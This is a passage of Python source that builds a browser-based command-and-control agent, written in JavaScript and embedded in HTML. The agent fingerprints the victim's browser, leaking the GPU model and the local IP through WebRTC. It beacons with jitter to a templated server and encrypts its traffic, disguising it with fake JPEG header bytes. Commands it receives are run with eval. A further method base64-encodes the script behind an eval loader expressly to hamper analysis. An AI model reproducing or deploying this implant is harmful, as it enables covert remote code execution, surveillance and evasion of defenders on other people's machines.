                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {
                // Silently fail
            }
            
            // Try WebRTC leak test - this might be blocked by privacy settings
            try {
                const pc = new RTCPeerConnection({
                    iceServers: []
                });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (ice.candidate) {
                        const matches = ice.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
                        if (matches) {
                            info.localIP = matches[1];
                        }
                    }
                };
            } catch (e) {
                // Silently fail - this is expected in many browsers
            }
            
            try {
                info.MachineGuid = window.clientMachineId;
            } catch (e) {
                // Silently fail
            }
            return info;
        }
    }
    
    // Default command handler
    defaultCommandHandler(commandType, args) {
        return `Command handled by default handler: ${commandType} with args: ${args}`;
    }
}

// Crypto operations for the agent
class KCMCrypto {
    constructor() {
        this.rsaParams = {
            name: 'RSA-OAEP',
            hash: {name: 'SHA-256'}
        };
        this.aesParams = {
            name: 'AES-CBC',  // Using AES-CBC to match PowerShell
            length: 256
        };
    }
    
    // Initialize crypto operations
    async initialize() {
        // Ensure WebCrypto API is available
        if (!window.crypto || !window.crypto.subtle) {
            throw new Error('WebCrypto API not available');
        }
        
        return true;
    }
    
    // Generate a new AES-256 key
    async generateAESKey() {
        try {
            // Generate a random AES-256 key (using CBC)
            const key = await window.crypto.subtle.generateKey(
                { name: 'AES-CBC', length: 256 },
                true,
                ['encrypt', 'decrypt']
            );
            
            return key;
        } catch (error) {
            console.error('Error generating AES key:', error);
            return null;
        }
    }
    
    // Import RSA public key from base64
    async importRSAPublicKey(base64Key) {
        try {
            // Decode the base64 key
            const binaryString = atob(base64Key);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            
            // Import as RSA public key
            return await window.crypto.subtle.importKey(
                'spki',
                bytes,
                {
                    name: 'RSA-OAEP',
                    hash: { name: 'SHA-256' }
                },
                false,
                ['encrypt']
            );
        } catch (error) {
            console.error('Error importing RSA public key:', error);
            return null;
        }
    }
    
    // Import AES key from base64
    async importAESKey(base64Key) {
        try {
            // Decode the base64 key
            const binaryString = atob(base64Key);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            
            // Import as AES key (using 'AES-CBC')
            return await window.crypto.subtle.importKey(
                'raw',
                bytes,
                {
                    name: 'AES-CBC',
                    length: 256
                },
                true, // extractable must be true
                ['encrypt', 'decrypt']
            );
        } catch (error) {
            console.error('Error importing AES key:', error);
            throw error; // Throw to propagate the error
        }
    }
    
    // Export AES key to raw bytes
    async exportAESKey(key) {
        try {
            const exported = await window.crypto.subtle.exportKey('raw', key);
            return new Uint8Array(exported);
        } catch (error) {
            console.error('Error exporting AES key:', error);
            return null;
        }
    }
    
    // Encrypt AES key with RSA public key
    async encryptKeyWithRSA(key, publicKey) {
        try {
            // Export the AES key to raw format
            const keyData = await this.exportAESKey(key);
            if (!keyData) return null;
            
            // Encrypt with RSA public key
            const encryptedKey = await window.crypto.subtle.encrypt(
                { name: 'RSA-OAEP' },
                publicKey,
                keyData
            );
            
            // Convert to Base64
            const encryptedKeyArray = new Uint8Array(encryptedKey);
            let binary = '';
            for (let i = 0; i < encryptedKeyArray.length; i++) {
                binary += String.fromCharCode(encryptedKeyArray[i]);
            }
            return btoa(binary);
        } catch (error) {
            console.error('Error encrypting key with RSA:', error);
            return null;
        }
    }
    
    // Encrypt data with AES-CBC (to match PowerShell)
    async encrypt(data, key) {
        if (!key) return data;
        
        try {
            // Convert data to string if it's not already
            const dataString = (typeof data === 'string') ? data : JSON.stringify(data);
            
            // Convert string to bytes
            const encoder = new TextEncoder();
            const dataBytes = encoder.encode(dataString);
            
            // Generate random IV (16 bytes for CBC)
            const iv = crypto.getRandomValues(new Uint8Array(16));
            
            // Add PKCS#7 padding MANUALLY - this is critical
            const blockSize = 16;
            const paddingLength = blockSize - (dataBytes.length % blockSize);
            const paddedData = new Uint8Array(dataBytes.length + paddingLength);
            paddedData.set(dataBytes);
            
            // Fill padding bytes with the padding length value
            for (let i = dataBytes.length; i < paddedData.length; i++) {
                paddedData[i] = paddingLength;
            }
            
            // Encrypt using WebCrypto with raw padded data
            const encryptedContent = await window.crypto.subtle.encrypt(
                { name: 'AES-CBC', iv: iv },
                key,
                paddedData
            );
            
            // Combine IV and encrypted content
            const result = new Uint8Array(iv.length + encryptedContent.byteLength);
            result.set(iv);
            result.set(new Uint8Array(encryptedContent), iv.length);
            
            // Add JPEG header bytes (0xFF, 0xD8, 0xFF) - EXACTLY as PowerShell does
            const jpegHeader = new Uint8Array([0xFF, 0xD8, 0xFF]);
            const withHeader = new Uint8Array(jpegHeader.length + result.length);
            withHeader.set(jpegHeader);
            withHeader.set(result, jpegHeader.length);
            
            // Convert to Base64 properly handling binary data
            let binary = '';
            for (let i = 0; i < withHeader.length; i++) {
                binary += String.fromCharCode(withHeader[i]);
            }
            return btoa(binary);
        } catch (error) {
            console.error('Encryption error:', error);
            return data; // Return original data if encryption fails
        }
    }
    
    // Decrypt data with AES-CBC (to match PowerShell)
    async decrypt(encryptedBase64, key) {
        if (!key) return encryptedBase64;
        
        try {
            // Decode Base64
            const binaryString = atob(encryptedBase64);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            
            // Check for and remove JPEG header (first 3 bytes)
            let dataWithoutHeader = bytes;
            if (bytes.length > 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
                dataWithoutHeader = bytes.slice(3);
            }
            
            // Extract IV and encrypted data
            const iv = dataWithoutHeader.slice(0, 16);
            const encryptedData = dataWithoutHeader.slice(16);
            
            // Decrypt the data
            const decryptedContent = await window.crypto.subtle.decrypt(
                { name: 'AES-CBC', iv: iv },
                key,
                encryptedData
            );
            
            // Convert to Uint8Array to handle padding removal
            const decryptedBytes = new Uint8Array(decryptedContent);
            
            // Remove PKCS#7 padding - get the last byte value as padding length
            const paddingLength = decryptedBytes[decryptedBytes.length - 1];
            const unpaddedBytes = decryptedBytes.slice(0, decryptedBytes.length - paddingLength);
            
            // Convert back to string
            const decoder = new TextDecoder();
            return decoder.decode(unpaddedBytes);
        } catch (error) {
            console.error('Decryption error:', error);
            return encryptedBase64; // Return original data if decryption fails
        }
    }
}

// Initialize and start the agent
window.onload = function() {
    try {
        // Create and configure the agent
        const agent = new KCMAgentCommunication({
            serverAddress: '{{SERVER_ADDRESS}}',
            protocol: '{{PROTOCOL}}',
            beaconInterval: {{BEACON_PERIOD}},
            jitterPercentage: {{JITTER_PERCENTAGE}},
            userAgent: '{{USER_AGENT}}',
            websocketFallback: {{WEBSOCKET_FALLBACK}},
            onCommandReceived: async function(commandType, args) {
                // Handle execute commands
                if (commandType === 'execute') {
                    try {
                        // Execute JavaScript
                        return eval(args);
                    } catch (e) {
                        return "Error executing command: " + e.message;
                    }
                }
                
                return "Command not implemented: " + commandType;
            },
            onConnectionStatus: function(status) {
                console.log("Connection status:", status);
            }
        });
        
        // Start the agent
        agent.start().catch(function(error) {
            console.error("Failed to start agent:", error);
        });
    } catch (e) {
        console.error("Error initializing agent:", e);
    }
};
"""
    
    @classmethod
    def _obfuscate_html(cls, html_content):
        """Obfuscate the HTML content to make analysis harder"""
        # Split into HTML and JS parts
        script_start = html_content.find("<script>")
        script_end = html_content.find("</script>", script_start)
        
        if script_start == -1 or script_end == -1:
            return html_content  # Can't find script tags, return as-is
        
        html_before = html_content[:script_start + 8]  # Include <script>
        js_code = html_content[script_start + 8:script_end]
        html_after = html_content[script_end:]
        
        # Basic JS obfuscation - You can implement more sophisticated obfuscation here
        # This is just a simple example to show the concept
        
        # 1. Encode strings
        js_lines = js_code.split('\n')
        obfuscated_lines = []
        
        for line in js_lines:
            # Skip comments and empty lines
            if line.strip().startswith('//') or not line.strip():
                continue
                
            # Keep the line but replace certain patterns
            obfuscated_line = line
            
            # Replace certain function names
            obfuscated_line = obfuscated_line.replace('getSystemInformation', '_gSI')
            obfuscated_line = obfuscated_line.replace('generateRandomToken', '_gRT')
            obfuscated_line = obfuscated_line.replace('encryptData', '_eD')
            obfuscated_line = obfuscated_line.replace('decryptData', '_dD')
            obfuscated_line = obfuscated_line.replace('sendBeacon', '_sB')
            obfuscated_line = obfuscated_line.replace('processCommand', '_pC')
            obfuscated_line = obfuscated_line.replace('startAgentLoop', '_sAL')
            
            obfuscated_lines.append(obfuscated_line)
        
        # Join back into a single string
        obfuscated_js = '\n'.join(obfuscated_lines)
        
        # 2. Use eval to load core functionality
        encoded_js = base64.b64encode(obfuscated_js.encode('utf-8')).decode('utf-8')
        
        loader_js = f"""
// Loader script
(function() {{
    const _x = atob("{encoded_js}");
    eval(_x);
}})();
"""
        
        # Reassemble HTML with obfuscated JS
        return html_before + loader_js + html_after
    
    @classmethod
    def _generate_random_string(cls, length=8):
        """Generate a random string of specified length"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))